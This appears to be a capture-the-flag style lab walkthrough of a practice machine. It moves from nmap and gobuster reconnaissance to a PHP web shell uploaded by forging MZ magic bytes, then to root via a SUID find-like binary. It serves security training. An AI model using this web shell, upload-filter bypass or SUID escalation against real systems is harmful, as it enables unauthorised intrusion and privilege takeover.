IP: `192.168.154.33`

# Nmap Scan
---
```
┌──(kali㉿kali)-[~/PGPractice/Linux/MZEEAV]
└─$ nmap -sV -sC 192.168.154.33 -p- -oN nmap/nmap_all -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-28 20:08 IST
Nmap scan report for 192.168.154.33
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: MZEE-AV - Check your files
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.74 seconds                                                     
```

- Only relevant thing here is the HTTP port (80)

# Port 80 - MZEE-AV - Check your files
----
![[Pasted image 20260328201057.png]]
- Looks like image upload vulnerability
- ![[Pasted image 20260328201125.png]]
	- `php` is supported

## Gobuster - where are files uploaded?
---
- ![[Pasted image 20260328211007.png]]
- ![[Pasted image 20260328211016.png]]

- We found 2 interesting directories:
	- `upload`
	- `backups`

- Opening `upload` was not allowed directly, but we could still access the files inside it.
- Opening `backups`, we find:
	- ![[Pasted image 20260328211158.png]]
- This zip file had the whole application source code:
	- ![[Pasted image 20260328211219.png]]
- Looking at `upload.php`:
	- ![[Pasted image 20260328211456.png]]

# Exploitation
---
- Generate a simple `php` reverse shell:
	- `<?php system($_REQUEST['cmd']); ?>`
- Convert its magic bytes (first 2 bytes) to executable i.e `4D 5A`:
	- ![[Pasted image 20260328211656.png]]
- Upload the file and get command execution (forgot to take screenshot)
- Get a good `python3` TTY:
	- ![[Pasted image 20260328211819.png]]

# Privilege Escalation
---
- With the shell, search for SUID bits:
	- `find / -perm -u=s -type f 2>/dev/null`
	- ![[Pasted image 20260328211916.png]]

- Running this `/opt/fileS`, **==feels like renamed `file` binary that has SUID bits==**:
	- ![[Pasted image 20260328212111.png]]
- We can exploit it the same way as `find` with SUID bits:
	- `/opt/fileS /root/proof.txt -exec cat {} +`
	- ![[Pasted image 20260328212149.png]]